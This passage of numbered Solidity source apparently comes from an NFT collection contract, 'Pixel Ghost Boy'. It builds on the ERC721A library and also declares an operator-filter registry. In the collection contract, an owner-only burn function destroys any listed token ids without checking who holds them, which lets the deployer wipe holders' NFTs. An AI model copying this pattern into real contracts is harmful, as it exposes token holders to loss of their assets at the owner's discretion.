1041      * @dev Mints `quantity` tokens and transfers them to `to`.
1042      *
1043      * Requirements:
1044      *
1045      * - `to` cannot be the zero address.
1046      * - `quantity` must be greater than 0.
1047      *
1048      * Emits a {Transfer} event for each mint.
1049      */
1050     function _mint(address to, uint256 quantity) internal virtual {
1051         uint256 startTokenId = _currentIndex;
1052         if (quantity == 0) revert MintZeroQuantity();
1053 
1054         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1055 
1056         // Overflows are incredibly unrealistic.
1057         // `balance` and `numberMinted` have a maximum limit of 2**64.
1058         // `tokenId` has a maximum limit of 2**256.
1059         unchecked {
1060             // Updates:
1061             // - `balance += quantity`.
1062             // - `numberMinted += quantity`.
1063             //
1064             // We can directly add to the `balance` and `numberMinted`.
1065             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1066 
1067             // Updates:
1068             // - `address` to the owner.
1069             // - `startTimestamp` to the timestamp of minting.
1070             // - `burned` to `false`.
1071             // - `nextInitialized` to `quantity == 1`.
1072             _packedOwnerships[startTokenId] = _packOwnershipData(
1073                 to,
1074                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1075             );
1076 
1077             uint256 toMasked;
1078             uint256 end = startTokenId + quantity;
1079 
1080             // Use assembly to loop and emit the `Transfer` event for gas savings.
1081             // The duplicated `log4` removes an extra check and reduces stack juggling.
1082             // The assembly, together with the surrounding Solidity code, have been
1083             // delicately arranged to nudge the compiler into producing optimized opcodes.
1084             assembly {
1085                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1086                 toMasked := and(to, _BITMASK_ADDRESS)
1087                 // Emit the `Transfer` event.
1088                 log4(
1089                     0, // Start of data (0, since no data).
1090                     0, // End of data (0, since no data).
1091                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1092                     0, // `address(0)`.
1093                     toMasked, // `to`.
1094                     startTokenId // `tokenId`.
1095                 )
1096 
1097                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1098                 // that overflows uint256 will make the loop run out of gas.
1099                 // The compiler will optimize the `iszero` away for performance.
1100                 for {
1101                     let tokenId := add(startTokenId, 1)
1102                 } iszero(eq(tokenId, end)) {
1103                     tokenId := add(tokenId, 1)
1104                 } {
1105                     // Emit the `Transfer` event. Similar to above.
1106                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1107                 }
1108             }
1109             if (toMasked == 0) revert MintToZeroAddress();
1110 
1111             _currentIndex = end;
1112         }
1113         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1114     }
1115 
1116     /**
1117      * @dev Mints `quantity` tokens and transfers them to `to`.
1118      *
1119      * This function is intended for efficient minting only during contract creation.
1120      *
1121      * It emits only one {ConsecutiveTransfer} as defined in
1122      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1123      * instead of a sequence of {Transfer} event(s).
1124      *
1125      * Calling this function outside of contract creation WILL make your contract
1126      * non-compliant with the ERC721 standard.
1127      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1128      * {ConsecutiveTransfer} event is only permissible during contract creation.
1129      *
1130      * Requirements:
1131      *
1132      * - `to` cannot be the zero address.
1133      * - `quantity` must be greater than 0.
1134      *
1135      * Emits a {ConsecutiveTransfer} event.
1136      */
1137     function _mintERC2309(address to, uint256 quantity) internal virtual {
1138         uint256 startTokenId = _currentIndex;
1139         if (to == address(0)) revert MintToZeroAddress();
1140         if (quantity == 0) revert MintZeroQuantity();
1141         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1142 
1143         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1144 
1145         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1146         unchecked {
1147             // Updates:
1148             // - `balance += quantity`.
1149             // - `numberMinted += quantity`.
1150             //
1151             // We can directly add to the `balance` and `numberMinted`.
1152             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1153 
1154             // Updates:
1155             // - `address` to the owner.
1156             // - `startTimestamp` to the timestamp of minting.
1157             // - `burned` to `false`.
1158             // - `nextInitialized` to `quantity == 1`.
1159             _packedOwnerships[startTokenId] = _packOwnershipData(
1160                 to,
1161                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1162             );
1163 
1164             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1165 
1166             _currentIndex = startTokenId + quantity;
1167         }
1168         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1169     }
1170 
1171     /**
1172      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1173      *
1174      * Requirements:
1175      *
1176      * - If `to` refers to a smart contract, it must implement
1177      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1178      * - `quantity` must be greater than 0.
1179      *
1180      * See {_mint}.
1181      *
1182      * Emits a {Transfer} event for each mint.
1183      */
1184     function _safeMint(
1185         address to,
1186         uint256 quantity,
1187         bytes memory _data
1188     ) internal virtual {
1189         _mint(to, quantity);
1190 
1191         unchecked {
1192             if (to.code.length != 0) {
1193                 uint256 end = _currentIndex;
1194                 uint256 index = end - quantity;
1195                 do {
1196                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1197                         revert TransferToNonERC721ReceiverImplementer();
1198                     }
1199                 } while (index < end);
1200                 // Reentrancy protection.
1201                 if (_currentIndex != end) revert();
1202             }
1203         }
1204     }
1205 
1206     /**
1207      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1208      */
1209     function _safeMint(address to, uint256 quantity) internal virtual {
1210         _safeMint(to, quantity, '');
1211     }
1212 
1213     // =============================================================
1214     //                        BURN OPERATIONS
1215     // =============================================================
1216 
1217     /**
1218      * @dev Equivalent to `_burn(tokenId, false)`.
1219      */
1220     function _burn(uint256 tokenId) internal virtual {
1221         _burn(tokenId, false);
1222     }
1223 
1224     /**
1225      * @dev Destroys `tokenId`.
1226      * The approval is cleared when the token is burned.
1227      *
1228      * Requirements:
1229      *
1230      * - `tokenId` must exist.
1231      *
1232      * Emits a {Transfer} event.
1233      */
1234     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1235         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1236 
1237         address from = address(uint160(prevOwnershipPacked));
1238 
1239         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1240 
1241         if (approvalCheck) {
1242             // The nested ifs save around 20+ gas over a compound boolean condition.
1243             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1244                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1245         }
1246 
1247         _beforeTokenTransfers(from, address(0), tokenId, 1);
1248 
1249         // Clear approvals from the previous owner.
1250         assembly {
1251             if approvedAddress {
1252                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1253                 sstore(approvedAddressSlot, 0)
1254             }
1255         }
1256 
1257         // Underflow of the sender's balance is impossible because we check for
1258         // ownership above and the recipient's balance can't realistically overflow.
1259         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1260         unchecked {
1261             // Updates:
1262             // - `balance -= 1`.
1263             // - `numberBurned += 1`.
1264             //
1265             // We can directly decrement the balance, and increment the number burned.
1266             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1267             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1268 
1269             // Updates:
1270             // - `address` to the last owner.
1271             // - `startTimestamp` to the timestamp of burning.
1272             // - `burned` to `true`.
1273             // - `nextInitialized` to `true`.
1274             _packedOwnerships[tokenId] = _packOwnershipData(
1275                 from,
1276                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1277             );
1278 
1279             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1280             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1281                 uint256 nextTokenId = tokenId + 1;
1282                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1283                 if (_packedOwnerships[nextTokenId] == 0) {
1284                     // If the next slot is within bounds.
1285                     if (nextTokenId != _currentIndex) {
1286                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1287                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1288                     }
1289                 }
1290             }
1291         }
1292 
1293         emit Transfer(from, address(0), tokenId);
1294         _afterTokenTransfers(from, address(0), tokenId, 1);
1295 
1296         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1297         unchecked {
1298             _burnCounter++;
1299         }
1300     }
1301 
1302     // =============================================================
1303     //                     EXTRA DATA OPERATIONS
1304     // =============================================================
1305 
1306     /**
1307      * @dev Directly sets the extra data for the ownership data `index`.
1308      */
1309     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1310         uint256 packed = _packedOwnerships[index];
1311         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1312         uint256 extraDataCasted;
1313         // Cast `extraData` with assembly to avoid redundant masking.
1314         assembly {
1315             extraDataCasted := extraData
1316         }
1317         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1318         _packedOwnerships[index] = packed;
1319     }
1320 
1321     /**
1322      * @dev Called during each token transfer to set the 24bit `extraData` field.
1323      * Intended to be overridden by the cosumer contract.
1324      *
1325      * `previousExtraData` - the value of `extraData` before transfer.
1326      *
1327      * Calling conditions:
1328      *
1329      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1330      * transferred to `to`.
1331      * - When `from` is zero, `tokenId` will be minted for `to`.
1332      * - When `to` is zero, `tokenId` will be burned by `from`.
1333      * - `from` and `to` are never both zero.
1334      */
1335     function _extraData(
1336         address from,
1337         address to,
1338         uint24 previousExtraData
1339     ) internal view virtual returns (uint24) {}
1340 
1341     /**
1342      * @dev Returns the next extra data for the packed ownership data.
1343      * The returned result is shifted into position.
1344      */
1345     function _nextExtraData(
1346         address from,
1347         address to,
1348         uint256 prevOwnershipPacked
1349     ) private view returns (uint256) {
1350         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1351         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1352     }
1353 
1354     // =============================================================
1355     //                       OTHER OPERATIONS
1356     // =============================================================
1357 
1358     /**
1359      * @dev Returns the message sender (defaults to `msg.sender`).
1360      *
1361      * If you are writing GSN compatible contracts, you need to override this function.
1362      */
1363     function _msgSenderERC721A() internal view virtual returns (address) {
1364         return msg.sender;
1365     }
1366 
1367     /**
1368      * @dev Converts a uint256 to its ASCII string decimal representation.
1369      */
1370     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1371         assembly {
1372             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1373             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1374             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1375             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1376             let m := add(mload(0x40), 0xa0)
1377             // Update the free memory pointer to allocate.
1378             mstore(0x40, m)
1379             // Assign the `str` to the end.
1380             str := sub(m, 0x20)
1381             // Zeroize the slot after the string.
1382             mstore(str, 0)
1383 
1384             // Cache the end of the memory to calculate the length later.
1385             let end := str
1386 
1387             // We write the string from rightmost digit to leftmost digit.
1388             // The following is essentially a do-while loop that also handles the zero case.
1389             // prettier-ignore
1390             for { let temp := value } 1 {} {
1391                 str := sub(str, 1)
1392                 // Write the character to the pointer.
1393                 // The ASCII index of the '0' character is 48.
1394                 mstore8(str, add(48, mod(temp, 10)))
1395                 // Keep dividing `temp` until zero.
1396                 temp := div(temp, 10)
1397                 // prettier-ignore
1398                 if iszero(temp) { break }
1399             }
1400 
1401             let length := sub(end, str)
1402             // Move the pointer 32 bytes leftwards to make room for the length.
1403             str := sub(str, 0x20)
1404             // Store the length.
1405             mstore(str, length)
1406         }
1407     }
1408 }
1409 
1410 
1411 interface IOperatorFilterRegistry {
1412     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1413     function register(address registrant) external;
1414     function registerAndSubscribe(address registrant, address subscription) external;
1415     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1416     function unregister(address addr) external;
1417     function updateOperator(address registrant, address operator, bool filtered) external;
1418     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1419     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1420     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1421     function subscribe(address registrant, address registrantToSubscribe) external;
1422     function unsubscribe(address registrant, bool copyExistingEntries) external;
1423     function subscriptionOf(address addr) external returns (address registrant);
1424     function subscribers(address registrant) external returns (address[] memory);
1425     function subscriberAt(address registrant, uint256 index) external returns (address);
1426     function copyEntriesOf(address registrant, address registrantToCopy) external;
1427     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1428     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1429     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1430     function filteredOperators(address addr) external returns (address[] memory);
1431     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1432     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1433     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1434     function isRegistered(address addr) external returns (bool);
1435     function codeHashOf(address addr) external returns (bytes32);
1436 }
1437 
1438 
1439 /**
1440  * @title  OperatorFilterer
1441  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1442  *         registrant's entries in the OperatorFilterRegistry.
1443  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1444  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1445  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1446  */
1447 abstract contract OperatorFilterer {
1448     error OperatorNotAllowed(address operator);
1449 
1450     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1451         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1452 
1453     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1454         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1455         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1456         // order for the modifier to filter addresses.
1457         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1458             if (subscribe) {
1459                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1460             } else {
1461                 if (subscriptionOrRegistrantToCopy != address(0)) {
1462                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1463                 } else {
1464                     OPERATOR_FILTER_REGISTRY.register(address(this));
1465                 }
1466             }
1467         }
1468     }
1469 
1470     modifier onlyAllowedOperator(address from) virtual {
1471         // Check registry code length to facilitate testing in environments without a deployed registry.
1472         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1473             // Allow spending tokens from addresses with balance
1474             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1475             // from an EOA.
1476             if (from == msg.sender) {
1477                 _;
1478                 return;
1479             }
1480             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1481                 revert OperatorNotAllowed(msg.sender);
1482             }
1483         }
1484         _;
1485     }
1486 
1487     modifier onlyAllowedOperatorApproval(address operator) virtual {
1488         // Check registry code length to facilitate testing in environments without a deployed registry.
1489         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1490             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1491                 revert OperatorNotAllowed(operator);
1492             }
1493         }
1494         _;
1495     }
1496 }
1497 
1498 /**
1499  * @title  DefaultOperatorFilterer
1500  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1501  */
1502 abstract contract TheOperatorFilterer is OperatorFilterer {
1503     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1504 
1505     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1506 }
1507 
1508 
1509 contract PixelGhostBoy is ERC721A {
1510     address public owner;
1511 
1512     uint256 public maxSupply = 1111;
1513 
1514     uint256 public mintPrice = 0.002 ether;
1515     //allowing 1 free per address so everyone can enter.
1516 
1517     mapping(address => uint256) private _userForFree;
1518 
1519     mapping(address => uint256) private _userMinted;
1520 
1521     function mint(uint256 amount) compliant(amount) payable public {
1522         require(totalSupply() + amount <= maxSupply);
1523         _safeMint(msg.sender, amount);
1524     }
1525 
1526     modifier compliant(uint256 amount) {
1527         if (msg.value == 0) {
1528             require(amount == 1);
1529             require(_userMinted[msg.sender] < FreeNum() 
1530                 && _userForFree[tx.origin] < 1 );
1531             _userForFree[tx.origin]++;
1532             _userMinted[msg.sender]++;
1533         } else {
1534             require(msg.value >= amount * mintPrice);
1535         }
1536         _;
1537     }
1538 
1539     function reserve(address addr, uint256 amount) public onlyOwner {
1540         require(totalSupply() + amount <= maxSupply);
1541         _safeMint(addr, amount);
1542     }
1543     
1544     modifier onlyOwner {
1545         require(owner == msg.sender);
1546         _;
1547     }
1548 
1549     constructor() ERC721A("Pixel Ghost Boy", "PGB") {
1550         owner = msg.sender;
1551     }
1552 
1553      function burn(uint256[] memory tokenids) external onlyOwner { //this is the burn claim
1554         uint256 len = tokenids.length;
1555         for (uint256 i; i < len; i++) {
1556             uint256 tokenid = tokenids[i];
1557             _burn(tokenid);
1558         }
1559      }
1560 
1561     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1562         return string(abi.encodePacked("ipfs://QmdSU7ZEZbF9kLeUz9oWDU9MQPVj8dxUhKaPAy6vojysFR/", _toString(tokenId), ".json"));
1563     }
1564 
1565     function FreeNum() internal returns (uint256){
1566         return 1;
1567     }
1568 
1569 
1570     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1571         uint256 royaltyAmount = (_salePrice * 50) / 1000;
1572         return (owner, royaltyAmount);
1573     }
1574 
1575     function withdraw() external onlyOwner {
1576         payable(msg.sender).transfer(address(this).balance);
1577     }
1578 }